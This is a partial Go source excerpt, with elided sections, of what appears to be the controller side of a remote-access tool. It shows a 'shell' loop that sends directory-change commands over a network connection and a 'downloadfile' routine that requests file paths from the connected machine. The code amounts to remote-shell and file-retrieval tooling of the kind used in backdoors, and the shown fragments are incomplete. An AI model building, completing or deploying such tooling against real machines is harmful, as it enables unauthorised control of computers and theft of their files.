...
func shell(conn net.Conn) {
	...
	fmt.Printf("+ Enter 'changedir' to enter change directory menu\n")
	for command != "q" {
		fmt.Printf("shell > ")
		...
		if command != "q" {
			if command == "changedir" {
				conn.Write([]byte("changedir"))

				currentdir := make([]byte, 128)
				conn.Read(currentdir)
				fmt.Printf("Current directory: %s\n", currentdir)
				fmt.Printf("Enter full path of new directory to change to or 'c' to cancel:\n")
				fmt.Printf("terminal > ")
				readdir := bufio.NewScanner(os.Stdin)
				readdir.Scan()
				newdir := readdir.Text()

				if newdir == "c" {
					fmt.Printf("+ Cancelling directory change...\n")
				} else {
					conn.Write([]byte(newdir))

					fmt.Printf("Directory changed!\n")
				}
			} else {
...
func downloadfile(conn net.Conn) {
	...
	fmt.Printf("Full path to the directory that the file is in:\n")
	fmt.Printf("path > ")
	readfilepath := bufio.NewScanner(os.Stdin)
	readfilepath.Scan()
	filepath := readfilepath.Text()

	conn.Write([]byte(filepath)) // sending the filepath to client
